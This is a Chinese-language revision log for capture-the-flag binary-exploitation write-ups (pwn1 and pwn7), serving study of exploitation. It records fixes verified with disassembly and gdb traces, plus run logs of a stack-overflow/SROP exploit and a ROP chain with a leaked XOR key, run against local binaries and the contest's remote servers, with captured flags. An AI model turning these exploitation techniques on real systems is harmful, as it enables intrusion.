# Review Round 2 — 修正套用紀錄（pwn1 / pwn7）

> 對象：`wp/review_round2_stack.md` 的 **7 條事實／一致性錯誤（E1~E7）** 與
> **8 個新手卡點（B1~B8）**。
> 原則：**動手改之前，先用 `objdump` / `readelf` / `gdb -q -batch` / `pwntools` 把審查者
> 附的驗證指令全部重跑一次**；只有我自己也驗證成立才套用，審查者說法有誤的地方不套用，
> 記在第 3 節。
>
> 修改的檔案（僅這些）：
> `pwn1/notes.md`、`pwn7/notes.md`、`pwn7/exploit.py`
> （`pwn1/exploit.py` 這次**沒有改動**：本輪沒有任何條目指向它）
> 未動 `wp/00_基礎知識_從零開始.md`、`wp/99_速查表.md`、`wp/README.md`、兩份 review 檔、
> 以及 `pwn2`~`pwn6`。

**結論：E1~E7、B1~B8 共 15 項全部已修／已補，0 項略過。**
四支 exploit 改完後重跑，全部 PASS（見第 4 節）。

---

## 1. 事實／一致性錯誤 E1 ~ E7

| # | 狀態 | 檔案 | 改了什麼（一行說明） |
|---|---|---|---|
| E1 | **已修** | `pwn7/notes.md`（§4.1 組語清單、§4.1 槽表、§6.2 `.bss` 圖）、`pwn7/exploit.py` 檔頭註解 | 迴圈改成「再開 **3 次 `/dev/null`** 放進 `0x40548c` / `0x405898` / `0x405ca4`」，並註明引數是 `0x4017fa mov rdi,rbp`（`rbp = 0x40306f = "/dev/null"`）；槽表補成 **4 個** `state=2`（只有 `0x405080` 是 `flag.txt`，其餘 3 個是 `/dev/null`），並解釋「迴圈先寫槽、後比較，所以 `0x405ca4` 也會被寫」；`exploit.py` 第 26 行註解同步 |
| E2 | **已修** | `pwn1/notes.md` §6 | 「3 次 read、**2 次** send」→「3 次 read、**3 次** send（第 1 次是墊檔的 24 bytes，第 2、3 次才是 payload 的兩段）」，與同段表格、`exploit.py` 的 3 次 `p.send()` 一致 |
| E3 | **已修** | `pwn1/notes.md` §3.3 | 表格最後一列拆成兩列（餵滿 payload → `[rsp]=0x40104f`；只餵 24 bytes → `[rsp]=0x40100a`），並在表格下方補「`0x40106b` 的 `[rsp]` 就是返回位址那一格」的 ⚠️ 說明；重現腳本從 2 個中斷點擴充到 **7 個**，會印出表格的每一列 |
| E4 | **已修** | `pwn7/notes.md` §9 #3 | 「`add rsp,0x40; pop rbx; ret`」→ 正確的 `add rsp,0x40; mov edx,0xd; mov edi,1; lea rsi,[rip+…]; pop rbx; **jmp write@plt**（尾呼叫，不是 `ret`）` |
| E5 | **已修** | `pwn1/notes.md` §5.3 | `csgsfs` 被設成「`0x33` / `0x2b` 之類」→ 改成「實測 `bytes(frame)[0xb8:0xc0]` = `33 00 00 00 00 00 00 00`，也就是 `cs = 0x33`、`gs`/`fs` = 0；x86-64 的 `sigcontext` 只有三個 u16，**沒有 `0x2b`**，不要多填一個值」 |
| E6 | **已修** | `pwn7/notes.md` §2.2 | 組語範圍 `0x40132c`~`0x4014a0` → **`0x401339`~`0x40146f`**（第一條 `movabs` ~ 最後一條 `mov [rsp+0x28],rbp`），並註明 `0x401474` 之後是 `prctl` 與 `seccomp` 的呼叫、不再是「寫 filter」 |
| E7 | **已修** | `pwn7/notes.md` §6 | 「我挑的**兩個**片段」→「我挑的**三個**片段（都在函式中段）」，與下面 3 列的表（`0x401f07` / `0x401fda` / `0x401c32`）一致 |

### 1.1 我的重驗方式與實測

**E1（`/dev/null` × 3、共 4 個 fd 槽）**
```bash
cd pwn7 && objdump -s -j .rodata service | sed -n '1,3p'
#   403060 52206e6f 20726573 706f6e73 650a002f  R no response../
#   403070 6465762f 6e756c6c 00666c61 672e7478  dev/null.flag.tx
#         → 0x40306f = "/dev/null"、0x403079 = "flag.txt" ✅
objdump -d -M intel --start-address=0x4017cc --stop-address=0x40181a service
#   4017cc: lea r12,[rbx+0xc24]      → r12 = 0x405080+0xc24 = 0x405ca4（比較值）
#   4017da: lea rdi,[rip+0x1898]     → 0x403079 "flag.txt"（第一次 open，只用這一次）
#   4017fa: mov rdi,rbp              → 迴圈的引數是 rbp
#   401806: mov DWORD PTR [rbx],0x2  → 先寫 state
#   40180c: call open@plt            → 再 open（rbp = 0x40306f = "/dev/null"）
#   401814: cmp rbx,r12 / jne        → 比較在寫槽「之後」才做
```
`gdb -q -batch`（`set follow-fork-mode child`、`b *0x40180c`）實跑：
```
[loop open] rdi=0x40306f "/dev/null"  slot_being_written=0x40548c
[loop open] rdi=0x40306f "/dev/null"  slot_being_written=0x405898
[loop open] rdi=0x40306f "/dev/null"  slot_being_written=0x405ca4
[after loop] slot#0 0x405080 state=2 fd=5 | 0x40548c state=2 | 0x405898 state=2 | 0x405ca4 state=2 | 0x4060b0 state=0
```
→ 迴圈跑 3 次、開的都是 `/dev/null`、4 個槽 `state` 都是 2，而槽表基底 `0x4060b0` 仍是 0 ✅
（只有 `0x405080` 是 flag fd；`index=-8` → `0x404050`、`index=-12` → `0x403020`，都不是槽，
這段也寫進 §4.1 的 ⚠️ 方塊裡了。）

**E2**：`grep -n "p\.send" pwn1/exploit.py` → 86 / 122 / 130 三筆（＋136 的 `sendline` 是拿 shell 之後），
`sed -n '490,499p'` 的表格自己有 3 列「我們送什麼」→ 原句「2 次 send」確實矛盾 ✅

**E3**：把輸入檔換成「只給 24 bytes」與「notes 的 `/tmp/in.bin`」各跑一次
`b *0x40106b` + `printf "[0x40106b] rsp=%#lx [rsp]=%#lx rax=%lu"`：
```
# 只餵 24 bytes（不溢位）
[0x40106b] rsp=0x7fffffffdf18 [rsp]=0x40100a rax=0
# 餵 notes 的 /tmp/in.bin（會溢位）
[0x40106b] rsp=0x7fffffffdf18 [rsp]=0x40104f rax=1024
[0x40106b] rsp=0x7fffffffdf20 [rsp]=0x401069 rax=15
```
→ 表格原本寫死 `0x40100a` 是「只有不溢位時的原值」，與腳本餵的 payload 矛盾 ✅ 已拆成兩列。

**E4**：`objdump -d -M intel --start-address=0x401f38 --stop-address=0x401f58 service`
```
401f38: add rsp,0x40
401f3c: mov edx,0xd
401f41: mov edi,0x1
401f46: lea rsi,[rip+0x10d1]   # 40301e "ERR bad size\n"
401f4d: pop rbx
401f4e: jmp 401190 <write@plt>   ← 尾呼叫，沒有 ret
```
✅ 已依此改寫（`0x401f34` 的 `ret` 是另一條路徑）。

**E5**：`python3 -c "from pwn import *; context.clear(arch='amd64'); print(bytes(SigreturnFrame())[0xb8:0xc0].hex())"`
→ `3300000000000000`（`cs = 0x33`、`gs = fs = 0`），frame 長度 248 = 0xf8 ✅

**E6**：`objdump -d -M intel --start-address=0x40132c --stop-address=0x4014a5 service`
→ `0x401339` 是第一條 `movabs`、`0x40146f` 是 `mov QWORD PTR [rsp+0x28],rbp`、
`0x401474` 是 `call prctl@plt`、`0x401494` 是 `call syscall@plt` ✅

**E7**：讀 §6 第 598–604 行，表格確實 3 列，下一段還專門介紹第 3 個 ✅

---

## 2. 新手卡點 B1 ~ B8

| # | 狀態 | 檔案 | 改了什麼 |
|---|---|---|---|
| B1 | **已補（最高優先）** | `pwn7/notes.md` §7 | §7 開頭新增**完整可執行**的程式片段（可直接貼上就跑）：補上 **5 個 `recvuntil` 同步點（①`sh>` 開場、②`sh>` NOTE 完成、③SUBMIT 的 `OK\n`、④d1 的 `OK\n`、⑤/⑥ d2 的 `OK\n`）+ `recvn(6)`**、`d1`/`d2` 的完整組裝（`d1[0x40]=0xff`、`d1[0x48:…]`、`assert len(stage)==112`）、`d3` 的 `[0x40]`/`[0x48]` 組裝，以及所有常數（`POP_RSP`…`RELAY_RX`）與 `xor_key()`，並警告「漏掉同步點會讓 `recvn(6)` 收到 `b'OK\n' + key[0]`」 |
| B2 | **已補** | `pwn7/notes.md` §7 標題下 | 加一句「完整、可直接執行的程式在 `pwn7/exploit.py`；本文只拆解關鍵段落」 |
| B3 | **已補** | `pwn1/notes.md` §3.3 | 重現腳本從 2 個中斷點擴充成 **7 個**（`0x401016`/`0x401017`/`0x401032`/`0x40104f`/`0x401054`/`0x40106b`/`0x401069`），會印出表格每一列；並貼上實跑輸出與「怎麼讀這份輸出」的三點說明；原本「`0x401069` 命中 4 次、rsi 差值 `0x08`、`rsp` 差 `0x90`」的內容**全部保留**（沒有為了換腳本而砍掉） |
| B4 | **已補** | `pwn7/notes.md` §2.1 開頭 | 新增 `fd` 的定義方塊（0/1/2 是 stdin/stdout/stderr、`open()` 回傳 fd、`dup2(sv[0],3)` 的意義、為什麼「flag fd 只在子行程」） |
| B5 | **已補** | `pwn7/notes.md` §7（階段 2 之前） | 新增 💡「`read` 的長度 vs 實際交付幾個 byte」：`bl` 由 `POP_RBX` 決定但回傳值是實際收到的量；`d1`/`d2` 必須**一次** `send()` 送完、`d3` 只需覆蓋到 `+0x50`。同時新增 📖 方塊明確定義 `d1`/`d2`/`d3` |
| B6 | **已補** | `pwn1/notes.md` §6 步驟 6 | 補上 exploit 尾段的解釋（`time.sleep(0.5)` / `time.sleep(1.5)` / `recvrepeat(3)` = 收到 3 秒內沒有新資料、用 regex 抓 `sun{…}`），並把程式碼改成與 `exploit.py` 第 135–138 行一致 |
| B7 | **已補** | `pwn1/notes.md` §6 步驟 5、§5.3 | 新增 💡「`frame.rsp` 只要是合法可寫位址就好（`execve` 成功根本用不到）；本題 `sh_addr+0x200 = buf+0x3a0` 仍在 0x400 輸入區內」；§5.3 的 `frame.rsp = 某個合法位址` 也加了指標 |
| B8 | **已補** | `pwn7/notes.md` §9 #4 | 「所以鏈的起點在 `buf + 0x48`」改成「**`read` 目標 + `0x40` = `rbx`、`read` 目標 + `0x48` = 鏈的第 0 個 qword**（階段 1 的「`read` 目標」是 `SUBMIT` 當時的 `rsp`；階段 2 之後是 `A1`/`A2`/`A3`）」 |

### 2.1 B1 的實跑驗證（兩個方向都測）

1. **片段本身可跑**：把 `pwn7/notes.md` §7 的程式碼區塊**逐字抽出**（`sed -n '772,838p' notes.md > /tmp/sec7.py`）執行：
   ```
   [+] Receiving all data: Done (30B)
   [*] Process './service' stopped with exit code -11 (SIGSEGV)
   b'OK\nSUNSHINE{local_test_flag}\n\n'
   ```
   → 照抄就跑得出來 ✅（`SIGSEGV` 是 flag 印完後鏈走到盡頭，預期行為）
2. **漏掉同步點真的會壞**：把第 ③ 個 `io.recvuntil(b'OK\n')` 拿掉後：
   ```
   LEAK_WITHOUT_SYNC3=b'OK\n\x1c\xcc\xdb'   key_used=4f4b0a1c   ← 錯的 key（= "OK\n" + key[0]）
   LEAK_WITH_SYNC3   =b'\xc9\x10\x0f\x8d\x00\x00'  key_used=c9100f8d   ← 正確
   ```
   → 審查者說的「`recvn(6)` 會收到 `b'OK\n' + key[0]`」完全正確，這段警告也寫進 §7 開頭 ✅

### 2.2 B3 的實跑驗證

把 §3.3 的 `make_input.py` 與 `/tmp/t.gdb` **逐字抽出**執行（`sed -n '265,271p'` / `sed -n '277,325p'`）：
```
[0x401016 進入 leak]     rsp=0x7fffffffdf18
[0x401017 push rsp 之後] rsp=0x7fffffffdf10   [rsp]=0x7fffffffdf18
[0x401032 pop rax 之後]  rsp=0x7fffffffdf18   rax=0x7fffffffdf18
[0x40104f 進入 vuln]     rsp=0x7fffffffdf18   [rsp]=0x40100a
[0x401054 之後 rsi]      rsi=0x7fffffffde98
[0x401069 syscall]       rsp=0x7fffffffdf18   rax=0
[0x40106b ret 前]        rsp=0x7fffffffdf18   [rsp]=0x40104f
[0x40104f 進入 vuln]     rsp=0x7fffffffdf20   [rsp]=0x401069
[0x401054 之後 rsi]      rsi=0x7fffffffdea0
[0x401069 syscall]       rsp=0x7fffffffdf20   rax=0
[0x40106b ret 前]        rsp=0x7fffffffdf20   [rsp]=0x401069
[0x401069 syscall]       rsp=0x7fffffffdf28   rax=15
[0x401069 syscall]       rsp=0x4141414141414141   rax=59
```
無任何 gdb 錯誤訊息、與貼在 notes 裡的實跑輸出逐字相符；
差值 `0x08`（`de98`→`dea0`）與 `0x90`（`de98`→`df28`）都對 ✅

---

## 3. 審查者說法需要調整 / 我自己踩到的坑

| 項目 | 審查者說法 | 我的查證 | 處理 |
|---|---|---|---|
| E1 的 gdb 腳本 | 腳本印 `$rbx+0x40c` 並標成 `this_slot`，輸出為 `0x40548c`/`0x405898`/`0x405ca4` | 中斷點下在 `0x40180c`（`call open` 前）時，`add rbx,0x40c` **已經執行完**，所以 `$rbx` 本身就是「這一圈在寫的槽」，`$rbx+0x40c` 是「下一個槽」（會多印一格 `0x4060b0`）。改用 `$rbx` 重跑得到 **`0x40548c` / `0x405898` / `0x405ca4`**，與審查者列的位址一致 | 腳本標籤的小瑕疵不影響結論（`/dev/null` × 3、4 個 `state=2` 槽全部成立），**結論照改**，用我自己的 gdb 輸出當證據 |
| E3 的建議替換文字 | 建議兩列都寫 `rsp=0x7fffffffdf08`，但同一條的驗證輸出量到的是 `rsp=0x7fffffffdf18` | 絕對位址依 ASLR 每輪不同；notes 的表格是**同一輪 gdb 的一致性敘述**（`leak = 0x…df08`、`buf = 0x…de88`、`0x40104f` 進入時 `rsp` 也是 `0x…df08`）。若改成 `df18` 反而會跟表格其他 4 列打架 | **保留 `df08`**（維持表格自洽），只改 `[rsp]` 的值；另加註「位址每輪不同、重點是差值」 |
| B3 的建議 | 建議把第 267–286 行的 gdb 腳本**換成**只印表格 6 列的版本 | 只換掉的話，「`0x401069` 被命中 4 次」「rsi 差 `0x08`/`rsp` 差 `0x90`」這段**很有用的內容就沒有腳本支撐了** | 改成**擴充**成 7 個中斷點的版本（表格每一列都印，且保留 `0x401054`/`0x401069` 兩列），兩者都顧到 |
| （新發現．非審查者項目）gdb 行內註解 | — | 我第一版把註解寫在 `b *0x401016` 後面，gdb 直接報 `Invalid character '#' in expression`、整個 `-x` 腳本中斷 | 已改成註解獨立放一行，並在腳本裡留一行說明提醒讀者；抽出檔案重跑已無錯誤 |
| pwn1 本地／遠端輸出的 `[x]` 進度行 | 審查者建議「實測輸出」加註「已省略 `[x]` 進度行」 | 這屬於 `wp/00` 或 pwn1 §7 的排版註記，且 §7 的輸出**內容**已與實跑相符 | 這一輪的 4 個檔案裡沒有需要改的地方，**未動**（避免無關改動） |

---

## 4. 迴歸測試（改完後實跑，四項全 PASS）

```
=== [1] pwn1 local（cd pwn1 && python3 exploit.py < /dev/null）===
[x] Starting local process './challenge'
[+] Starting local process './challenge': pid 3544232
[+] stack leak  = 0x7fff88623788
[*] vuln buffer = 0x7fff88623708

[+] raw output:
sun{LOCAL_DUMMY_FLAG}
uid=1001(kzzz) gid=1001(kzzz) groups=1001(kzzz),65534(nobody)
DONE

[+] FLAG: sun{LOCAL_DUMMY_FLAG}
[*] Stopped process './challenge' (pid 3544232)
[exit=0]

=== [2] pwn1 remote（cd pwn1 && python3 exploit.py REMOTE < /dev/null）===
[x] Opening connection to chal.sunshinectf.games on port 26003
[x] Opening connection to chal.sunshinectf.games on port 26003: Trying 35.211.211.18
[+] Opening connection to chal.sunshinectf.games on port 26003: Done
[+] stack leak  = 0x7ffcf326fa88
[*] vuln buffer = 0x7ffcf326fa08

[+] raw output:
sun{r3caLl_ev3Ry_reGist3r_sR0p}
uid=1337(total_recall) gid=1337(total_recall) groups=1337(total_recall)
DONE

[+] FLAG: sun{r3caLl_ev3Ry_reGist3r_sR0p}
[*] Closed connection to chal.sunshinectf.games port 26003
[exit=0]

=== [3] pwn7 local（cd pwn7 && python3 exploit.py < /dev/null）===
[x] Starting local process './service'
[+] Starting local process './service': pid 3544485
[*] stage2 pre=b'OK\n' leak=75245fdd0000 A2=0x40a228
[+] XOR key = 75245fdd
[*] stage3 d2ok=b'OK\n' A3=0x40a2e0 RESP=0x40a340
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 30B
[+] Receiving all data: Done (30B)
[*] Process './service' stopped with exit code -11 (SIGSEGV) (pid 3544485)

[+] raw  : b'OK\nSUNSHINE{local_test_flag}\n\n'
[+] FLAG: SUNSHINE{local_test_flag}
[exit=0]

=== [4] pwn7 remote（cd pwn7 && python3 exploit.py REMOTE < /dev/null）===
[x] Opening connection to chal.sunshinectf.games on port 26007
[x] Opening connection to chal.sunshinectf.games on port 26007: Trying 35.211.211.18
[+] Opening connection to chal.sunshinectf.games on port 26007: Done
[*] stage2 pre=b'OK\n' leak=6d6f88cb0000 A2=0x40a228
[+] XOR key = 6d6f88cb
[*] stage3 d2ok=b'OK\n' A3=0x40a2e0 RESP=0x40a340
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 3B
[x] Receiving all data: 44B
[+] Receiving all data: Done (44B)
[*] Closed connection to chal.sunshinectf.games port 26007

[+] raw  : b'OK\nsun{n3gat1ve_h4ndl3s_0pen_s3cret_d00rs}\n\n'
[+] FLAG: sun{n3gat1ve_h4ndl3s_0pen_s3cret_d00rs}
[exit=0]
```

| 測試 | 結果 | flag |
|---|---|---|
| pwn1 local | **PASS** | `sun{LOCAL_DUMMY_FLAG}` |
| pwn1 REMOTE | **PASS** | `sun{r3caLl_ev3Ry_reGist3r_sR0p}` |
| pwn7 local | **PASS** | `SUNSHINE{local_test_flag}` |
| pwn7 REMOTE | **PASS** | `sun{n3gat1ve_h4ndl3s_0pen_s3cret_d00rs}` |

> pwn7 本地結尾的 `SIGSEGV` 是預期行為（flag 印完後鏈走到盡頭），與 §8 的說明一致。
> 這一輪只改了 **1 支 exploit 的註解**（`pwn7/exploit.py` 檔頭第 25–28 行），
> **沒有任何邏輯改動**，四項測試改前改後都 PASS。

---

## 5. 其他一致性檢查

* `pwn7/exploit.py` 檔頭新增的說明與 §4.1／§6.2 的敘述一致：
  4 個 `state=2` 槽、只有 `0x405080` 是 flag fd、迴圈「先寫後比」多寫一格。
* 新加的 §7 片段與 `exploit.py` 逐項對照：常數（`POP_RSP`/`POP_RDI`/`POP_RSI`/`POP_RBX`/
  `WRITE_RDX_RAX`/`SUBMIT_READ`/`RELAY_RX`/`KEY`/`NOTES`/`PIVOT_TOP`/`A1`）、`xor_key()`、
  5 個 `recvuntil` + 1 個 `recvn(6)`、`A2`/`A3`/`RESP` 三條公式、`time.sleep(0.7)`、`recvall(3)`
  **全部一致**（`A2=0x40a228`、`A3=0x40a2e0`、`RESP=0x40a340` 也與實跑 log 相符）。
* 兩份 notes 的 ``` 圍籬數量皆為偶數（pwn1 = 66、pwn7 = 96），沒有破版的程式碼區塊。

---

## 6. 一句話總結

E1~E7 七條事實／一致性錯誤全數修正（E1 的 fd 槽、E2 的 send 次數、E3 的 `[rsp]` 與重現腳本、
E4 的尾呼叫、E5 的 `cs`、E6 的組語範圍、E7 的數量詞）；B1~B8 八個新手卡點全數補上
（其中 B1「§7 照抄跑不起來」是最高優先，已改成逐字抽出即可執行的完整片段並實測通過）。
審查者有三處需要微調（E1 腳本的 `this_slot` 標籤、E3 建議文字的 `rsp` 值、B3「換掉」腳本的取捨），
已記在第 3 節並以實測為準；另有一個我自己踩到的 gdb 行內註解坑，已修掉並寫進腳本提醒。
四支 exploit 重跑全部 PASS。
